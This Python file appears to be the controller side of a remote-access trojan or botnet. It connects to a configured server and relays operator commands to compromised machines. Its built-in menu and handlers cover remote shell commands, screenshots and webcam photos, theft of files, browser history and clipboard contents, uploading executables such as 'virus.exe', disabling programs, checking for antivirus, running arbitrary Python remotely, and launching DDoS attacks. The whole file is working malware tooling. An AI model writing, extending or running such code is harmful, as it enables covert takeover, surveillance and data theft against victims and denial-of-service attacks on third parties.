# -*- coding: utf-8 -*-
import os

import socket
import threading
import time
rd = open('./config/lj.txt','r',encoding='utf-8').read().split(',')
open('./ddos.ddos','w',encoding='utf-8').write('')
open('./close.close', 'w', encoding='utf-8').write('[]')
ip = rd[0]
port = int(rd[1])
ip_port = (ip,port)

sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sk.connect(ip_port)

def js():
    while True:
        date=sk.recv(8192)#接受信息
        content = date.decode('utf-8')
        if content[:5] == 'king:':
            continue
        else:
            print(date.decode('utf-8'))

sw=threading.Thread(target=js)
sw.setDaemon(1)
sw.start()
sk.send('king:hello'.encode('utf-8'))
while True:
    time.sleep(0.5)
    date=input();dt = 'king:'+date
    if date == 'clear':
        os.system('cls')
        continue
    elif date[:5] == 'give:':
        try:
            nr = date[5:].split(' | ')
            open('./filepath.filepath', 'w', encoding='utf-8').write(nr[0])
            gv = 'king:give:' + nr[1]
            sk.send(gv.encode(encoding='utf-8'))
        except Exception as a:
            print('give error')
            print(a)
    elif date == 'help':
        print('''
help:

run cmd                      example=>  cmd:ipconfig
restart                      example=>  restart
shutdown                     example=>  shutdown
send msg                     example=>  send:hello
input                        example=>  input:hello
remove this file             example=>  remove this
computer config              example=>  config
say                          example=>  say:hello
screenshot                   example=>  screenshot
photo                        example=>  photo
see folder                   example=>  file:C:\\
remove file                  example=>  remove:C:\\jinitaimei\\hh.txt
copy file                    example=>  copy:C:\\jinitaimei\\kk.txt
upload file                  example=>  give:C:\\virus.exe
get file                     example=>  get file:C:\\Confidential documents.txt
file rename                  example=>  rename:C:\\a.txt | C:\\b.txt
make dir                     example=>  make dir:C:\\tool\\new dir
make file                    example=>  make file:C:\\tool\\a.txt | file content
all drive                    example=>  all drive
close                        example=>  close
View connections             example=>  hello
run python code              example=>  run:C:\\tool\\run.py
clear                        example=>  clear
ddos                         example=>  ddos:http://127.0.0.1
stop ddos                    example=>  ddos:
disable exe                  example=>  disable:a.exe
enable exe (like disable)    example=>  enable:a.exe
get browser                  example=>  get browser
get browser history          example=>  browser history:chrome
get clipboard content        example=>  get clipboard
Get Antivirus software       example=>  get antivirus
is administrator ?           example=>  is admin
Edit Python code and run     example=>  python
Control specified goals      example=>  ip:192.168.3.24:config
use module                   example=>  use module name
Know all modules             example=>  help-module
help                         example=>  help
        ''')
    elif date == 'help-module':
        wenjianjiayuwenjianjia = []
        for root, dirs, files in os.walk('./use'):
            wenjianjiayuwenjianjia.append(files)
            break
        wj = '\n'
        for i in wenjianjiayuwenjianjia[0]:
            wj += 'module:' + i[:-3] + '\n'
        print(wj)
    elif date[:4] == 'run:':
        nr = 'king:run:'+open(date[4:],'r',encoding='utf-8').read()
        sk.send(nr.encode(encoding='utf-8'))
    elif date[:8] == 'disable:':
        lst = eval(open('./close.close','r',encoding='utf-8').read())
        lst.append(date[8:])
        open('./close.close', 'w', encoding='utf-8').write(str(lst))
    elif date[:7] == 'enable:':
        lst = eval(open('./close.close','r',encoding='utf-8').read())
        jl = 0
        for i in lst:
            if i == date[7:]:
                del lst[jl]
                break
            jl += 1
        open('./close.close', 'w', encoding='utf-8').write(str(lst))
    elif date[:5] == 'ddos:':
        nr = date[5:]
        open('./ddos.ddos','w',encoding='utf-8').write(nr)
    elif date == 'python':
        code = ''
        jl = 'yes'
        print("If completed, please enter 'ok'\nIf you want to cancel, please enter 'exit'")
        while True:
            cd = input('>>')
            if cd == 'ok':
                break
            elif cd == 'exit':
                jl = 'no'
                break
            else:
                code += cd + '\n'
        if jl == 'yes':
            nr = 'king:run:'+code
            sk.send(nr.encode(encoding='utf-8'))
    elif date[:4] == 'use ':
        try:
            nr = 'king:run:'+open('use/'+date[4:]+'.py','r',encoding='utf-8').read()
            sk.send(nr.encode(encoding='utf-8'))
        except:
            print('no this module')
    else:
        sk.send(dt.encode(encoding='utf-8'))
sk.close#结束连接
